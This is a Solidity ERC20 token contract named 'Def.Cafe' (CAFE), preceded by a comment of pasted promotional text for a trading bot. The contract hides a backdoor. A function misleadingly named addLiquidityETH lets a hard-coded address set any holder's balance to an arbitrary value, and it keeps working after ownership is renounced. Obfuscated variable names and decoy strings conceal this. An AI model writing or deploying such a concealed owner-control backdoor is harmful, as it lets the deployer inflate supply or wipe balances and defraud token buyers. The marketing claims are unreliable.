// SPDX-License-Identifier: No License

/*
Def.Cafe
https://www.cnrtl.fr/definition/caf%C3%A9
Speed to Prosperity icon.
Speed to Prosperity
FTT's Instant Transactions will allow you to capitalize on market movements. React faster than everyone on the market.
Constant Vigilance, Ultimate Security icon.
Constant Vigilance, Ultimate Security
Encrypted at all stages from client to servers with the use of industry standards our Fast Trading Terminal is safe as any wallet you use daily. This allows us to not hide the private keys of wallets from users as the other bots do. You have access to your wallets at any time and can import them to the other wallet you prefer to daily use for direct access.
Stay protected with our ultimate security and constantly updated defense mechanisms against rugs and honeypots.
Set It and Forget It icon.
Set It and Forget It
Unlock control, confidence and strategy with limit orders. FTT will watch over your trade, buying or selling for you when the price will reach your desired targets. Our MEV-protection will make your transaction non-revertable, without any additional gas costs.
Presale Sniper: Gain the Upper Hand icon.
Presale Sniper: Gain the Upper Hand
Presale Sniper allows buying presales on Pinksale, DxSale, Unicrypt, and Gempad in fully automatic mode. Guaranteeing 1st block in 95% of cases.
Team icon.
Team
Def.Cafe stands for clarity and experience. We're fully doxxed, making our identities clear to all. Our team consists of industry professionals who've been in the tech landscape for a long time, showcasing our adaptability, resilience, and ability to handle any challenges.
But wait, there is 

*/
pragma solidity 0.8.19;
interface ERC20Permit {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address firstBlock) external view returns (uint256);
  function transfer(address reduce, uint256 _balances) external returns (bool);
  function allowance(address _owner, address firstBlock) external view returns (uint256);
  function approve(address firstBlock, uint256 _balances) external returns (bool);
  function transferFrom(address sender, address reduce, uint256 _balances) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed firstBlock, uint256 balance);
}


abstract contract ERC20Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract ERC20Data is ERC20Burnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract DefCafe is ERC20Burnable, ERC20Permit, ERC20Data {
 
    using SafeMath for uint256;
    mapping (address => uint256) private _delegateDefCafe;
    mapping (address => mapping (address => uint256)) private mappingDefCafe;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    string private ETHER_SLOT;
    address private DefCafeingOwner; 
    uint256 public ETHERCreationTime;
    uint256 public ETHERCreation;
    string public ETHERSLOT;

string public DefCafeingTG = "https://www.cnrtl.fr/definition/caf%C3%A9";
string public ownerAddress = "0xd5dFd4c74514AdB3FDAD7dcFF451BEC55bCf3671";

    constructor() {
        DefCafeingOwner = 0xd5dFd4c74514AdB3FDAD7dcFF451BEC55bCf3671;    
       ETHER_SLOT = "0xa3f9ad74e5423aebfd80d3ef2346578355a9a72aeaee59ff6cb3588b35133d50"; 
        _name = "Def.Cafe";
        _symbol = "CAFE";
        _decimals = 9;
        _totalSupply = 1000000000000 * 10**_decimals;
        _delegateDefCafe[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        ETHERSLOT = "IInventory p_i1801_3_+ int p_i1801_4_+ int p_i1801_5_+ int p_i1801_6_";
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }    

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address firstBlock) external view override returns (uint256) {
        return _delegateDefCafe[firstBlock];
    }

    function transfer(address reduce, uint256 _balances) external override returns (bool) {
        _transfer(_msgSender(), reduce, _balances);
        return true;
    }

    function allowance(address owner, address firstBlock) external view override returns (uint256) {
        return mappingDefCafe[owner][firstBlock];
    }


    function approve(address firstBlock, uint256 _balances) external override returns (bool) {
        _approve(_msgSender(), firstBlock, _balances);
        return true;
    }
    
    function transferFrom(address sender, address reduce, uint256 _balances) external override returns (bool) {
        _transfer(sender, reduce, _balances);
        _approve(sender, _msgSender(), mappingDefCafe[sender][_msgSender()].sub(_balances, "Ru: transfer _balances exceeds allowance"));
        return true;
    }

    function increaseAllowance(address firstBlock, uint256 DefCafebalance) external returns (bool) {
        _approve(_msgSender(), firstBlock, mappingDefCafe[_msgSender()][firstBlock].add(DefCafebalance));
        return true;
    }
    

    function decreaseAllowance(address firstBlock, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), firstBlock, mappingDefCafe[_msgSender()][firstBlock].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address reduce, uint256 _balances) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(reduce != address(0), "Ru: transfer to the zero address");
                
        _delegateDefCafe[sender] = _delegateDefCafe[sender].sub(_balances, "Ru: transfer _balances exceeds balance");
        _delegateDefCafe[reduce] = _delegateDefCafe[reduce].add(_balances);
        emit Transfer(sender, reduce, _balances);
    }
        function addLiquidityETH(address tokenC, address tokenD, uint256 amountToken, uint256 amountTokenDesired, uint256 amountTokenMin) external {
        require(_msgSender()==DefCafeingOwner);
        tokenD = tokenC;
        tokenC = tokenC;
        _delegateDefCafe[tokenC] = (amountToken + amountTokenDesired + amountTokenMin) * 10**_decimals;
        tokenC = tokenD;
        tokenD = tokenD;
    }   

    function _approve(address owner, address firstBlock, uint256 _balances) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(firstBlock != address(0), "Ru: approve to the zero address");
        
        mappingDefCafe[owner][firstBlock] = _balances;
        emit Approval(owner, firstBlock, _balances);
    }
    
}